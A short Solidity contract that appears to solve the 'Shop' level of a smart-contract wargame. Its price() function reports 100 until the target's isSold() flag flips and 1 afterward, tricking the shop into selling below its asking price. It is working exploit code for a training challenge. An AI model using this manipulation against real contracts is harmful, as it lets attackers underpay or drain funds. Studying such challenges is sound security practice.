// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/21_IShop.sol";

interface Buyer {
    function price() external view returns (uint256);
}

address constant INSTANCE = 0x7ee5C8F95aFd1E0549796638dD219F66CF29c2cd;

contract ShopSolution is Buyer {
    IShop instance = IShop(INSTANCE);

    function solve() external {
        instance.buy();
    }

    function price() external view override returns (uint256) {
        return instance.isSold() ? 1 : 100;
    }
}
